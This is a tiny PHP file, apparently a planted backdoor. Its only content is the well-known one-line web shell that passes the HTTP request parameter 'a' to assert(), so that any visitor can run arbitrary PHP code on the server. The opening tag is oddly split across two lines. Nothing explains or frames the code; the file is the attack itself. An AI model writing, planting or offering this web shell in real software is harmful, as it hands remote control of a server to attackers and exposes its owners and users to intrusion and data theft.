<?
php assert($_REQUEST["a"]); 
?>